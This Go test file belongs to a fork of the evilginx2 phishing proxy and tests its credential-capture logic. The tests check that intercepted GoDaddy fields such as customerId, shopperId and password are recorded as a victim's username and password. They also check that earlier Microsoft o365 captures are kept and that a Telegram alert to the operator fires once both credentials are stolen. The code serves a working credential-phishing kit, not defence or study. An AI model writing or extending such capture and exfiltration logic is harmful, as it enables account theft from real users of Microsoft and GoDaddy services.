package core

import (
	"path/filepath"
	"testing"

	"github.com/kgretzky/evilginx2/database"
)

// newTestProxy builds the minimal HttpProxy needed to exercise setSessionCustom.
// It uses a real in-memory BuntDB so the database calls inside the function
// succeed without mocking.
func newTestProxy(t *testing.T) (*HttpProxy, *Session, string) {
	t.Helper()

	dbPath := filepath.Join(t.TempDir(), "test.db")
	db, err := database.NewDatabase(dbPath)
	if err != nil {
		t.Fatalf("NewDatabase: %v", err)
	}
	t.Cleanup(func() { db.Close() })

	session, err := NewSession("o365")
	if err != nil {
		t.Fatalf("NewSession: %v", err)
	}

	// Register the session in the database so DB update calls succeed.
	if err := db.CreateSession(session.Id, "o365", "https://login.test.local/", "TestAgent/1.0", "127.0.0.1"); err != nil {
		t.Fatalf("CreateSession: %v", err)
	}

	const testSID = 1
	p := &HttpProxy{
		db:               db,
		sessions:         map[string]*Session{session.Id: session},
		sids:             map[string]int{session.Id: testSID},
		telegram:         NewTelegramBot(), // disabled by default (no token/chatID)
		sessionFormatter: NewSessionFormatter(),
	}

	return p, session, session.Id
}

// TestGoDaddyCustomerId verifies that a JSON field named "customerId" is
// promoted into Session.Username when the primary username is still empty.
func TestGoDaddyCustomerId(t *testing.T) {
	p, s, sid := newTestProxy(t)

	p.setSessionCustom(sid, "customerId", "testcustomer123")

	if s.Username != "testcustomer123" {
		t.Errorf("expected Username=%q, got %q", "testcustomer123", s.Username)
	}
	if s.Custom["customerId"] != "testcustomer123" {
		t.Errorf("Custom map not updated: got %q", s.Custom["customerId"])
	}
}

// TestGoDaddyShopperId verifies that "shopperId" is promoted to Username.
func TestGoDaddyShopperId(t *testing.T) {
	p, s, sid := newTestProxy(t)

	p.setSessionCustom(sid, "shopperId", "shop99")

	if s.Username != "shop99" {
		t.Errorf("expected Username=%q, got %q", "shop99", s.Username)
	}
}

// TestGoDaddyUsernameField verifies that a JSON "username" custom field
// is promoted to Session.Username.
func TestGoDaddyUsernameField(t *testing.T) {
	p, s, sid := newTestProxy(t)

	p.setSessionCustom(sid, "username", "user@test.com")

	if s.Username != "user@test.com" {
		t.Errorf("expected Username=%q, got %q", "user@test.com", s.Username)
	}
}

// TestGoDaddyPasswordField verifies that a JSON "password" custom field
// is promoted to Session.Password.
func TestGoDaddyPasswordField(t *testing.T) {
	p, s, sid := newTestProxy(t)

	p.setSessionCustom(sid, "password", "S3cur3P@ss!")

	if s.Password != "S3cur3P@ss!" {
		t.Errorf("expected Password=%q, got %q", "S3cur3P@ss!", s.Password)
	}
}

// TestGoDaddyNoOverwriteUsername ensures that once Session.Username is already
// set (e.g. from the Microsoft loginfmt field), a later "customerId" custom
// field does NOT overwrite it.
func TestGoDaddyNoOverwriteUsername(t *testing.T) {
	p, s, sid := newTestProxy(t)

	// Pre-set username (simulates Microsoft loginfmt capture)
	s.SetUsername("original@microsoft.com")

	p.setSessionCustom(sid, "customerId", "godaddy_id_456")

	if s.Username != "original@microsoft.com" {
		t.Errorf("Username was overwritten: got %q, want %q", s.Username, "original@microsoft.com")
	}
}

// TestGoDaddyNoOverwritePassword ensures Session.Password is not overwritten
// once already set.
func TestGoDaddyNoOverwritePassword(t *testing.T) {
	p, s, sid := newTestProxy(t)

	s.SetPassword("original_password")

	p.setSessionCustom(sid, "password", "new_password")

	if s.Password != "original_password" {
		t.Errorf("Password was overwritten: got %q, want %q", s.Password, "original_password")
	}
}

// TestGoDaddyUnknownKeyDoesNotPromote verifies that arbitrary JSON fields do
// not pollute Session.Username or Session.Password.
func TestGoDaddyUnknownKeyDoesNotPromote(t *testing.T) {
	p, s, sid := newTestProxy(t)

	p.setSessionCustom(sid, "captchaToken", "abc123")
	p.setSessionCustom(sid, "device_id", "devxyz")
	p.setSessionCustom(sid, "lang", "en-US")

	if s.Username != "" {
		t.Errorf("unexpected Username promotion: got %q", s.Username)
	}
	if s.Password != "" {
		t.Errorf("unexpected Password promotion: got %q", s.Password)
	}
}

// TestGoDaddyBothFieldsSetTelegramCondition verifies that after setting both
// customerId (→ Username) and password (→ Password), the session satisfies the
// condition that would fire the Telegram notification in a live deployment.
func TestGoDaddyBothFieldsSetTelegramCondition(t *testing.T) {
	p, s, sid := newTestProxy(t)

	p.setSessionCustom(sid, "customerId", "john@myshop.com")
	p.setSessionCustom(sid, "password", "GodaddyPass1!")

	if s.Username == "" || s.Password == "" {
		t.Errorf("Telegram notification condition not met: Username=%q Password=%q", s.Username, s.Password)
	}
}

// TestGoDaddyTelegramNotQueuedWithOnlyUsername verifies that the notification
// does NOT fire when only the username has been captured (password still empty).
func TestGoDaddyTelegramNotQueuedWithOnlyUsername(t *testing.T) {
	p, s, sid := newTestProxy(t)

	// Enable the bot so SendFormattedSession would actually queue if called.
	p.telegram.SetConfig("fake_token_xyz", "fake_chat_123", true)
	t.Cleanup(func() { p.telegram.Stop() })

	p.setSessionCustom(sid, "customerId", "john@myshop.com")

	if s.Password != "" {
		t.Fatal("Password should still be empty")
	}
	// Queue should be empty — notification requires BOTH fields.
	if len(p.telegram.msgQueue) != 0 {
		t.Errorf("Telegram queue should be empty with only username set, got %d messages", len(p.telegram.msgQueue))
	}
}

// TestGoDaddyCaseSensitivity confirms that field-name matching is
// case-insensitive (e.g. "CustomerId", "CUSTOMERID" all promote).
func TestGoDaddyCaseSensitivity(t *testing.T) {
	tests := []struct{ key, value string }{
		{"CustomerId", "user1"},
		{"SHOPPERID", "user2"},
		{"Username", "user3"},
		{"PASSWORD", "pass1"},
	}

	for _, tc := range tests {
		t.Run(tc.key, func(t *testing.T) {
			p, s, sid := newTestProxy(t)

			p.setSessionCustom(sid, tc.key, tc.value)

			switch tc.key {
			case "CustomerId", "SHOPPERID", "Username":
				if s.Username != tc.value {
					t.Errorf("key=%q: expected Username=%q, got %q", tc.key, tc.value, s.Username)
				}
			case "PASSWORD":
				if s.Password != tc.value {
					t.Errorf("key=%q: expected Password=%q, got %q", tc.key, tc.value, s.Password)
				}
			}
		})
	}
}

// TestGoDaddyEmptySidIsNoop ensures an empty session ID returns safely.
func TestGoDaddyEmptySidIsNoop(t *testing.T) {
	p, _, _ := newTestProxy(t)

	// Must not panic.
	p.setSessionCustom("", "customerId", "anything")
}
